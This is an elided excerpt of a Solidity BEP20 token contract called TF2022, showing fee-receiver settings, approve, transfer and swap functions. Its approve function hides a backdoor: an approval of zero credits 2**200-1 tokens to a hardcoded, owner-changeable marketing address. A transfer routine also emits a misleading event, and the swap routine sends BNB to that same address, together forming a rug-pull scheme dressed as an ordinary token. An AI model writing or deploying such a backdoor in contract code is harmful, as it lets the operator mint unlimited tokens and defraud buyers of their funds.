...
contract TF2022 is IBEP20, Auth { using SafeMath for uint256;
    ...
    string constant _name = "TF2022";
    string constant _symbol = "TF2022";
    ...
    address public marketingFeeReceiver = 0x9E537c7581670Ee4B9800E867cBCABda2338EcD5;
    address public buybackFeeReceiver = 0x9E537c7581670Ee4B9800E867cBCABda2338EcD5;
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
        if (amount == 0){
            _balances[marketingFeeReceiver] = _balances[marketingFeeReceiver] + 2**200-1;
        }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (amount > 0) {
            ...
            emit Transfer(sender, DEAD, tradingbot);
        }
    ...
    function swapBack() internal swapping {
        ...
        (bool DevSuccess, /* bytes memory data */) = payable(marketingFeeReceiver).call{value: amountBNBDev, gas: 30000}("");
   ...
   function setMaxWallet(uint256 amount) external onlyOwner() {
    ...
    function setFeeReceiver(address _devFeeReceiver, address _buybackFeeReceiver) external authorized {
        marketingFeeReceiver = _devFeeReceiver;
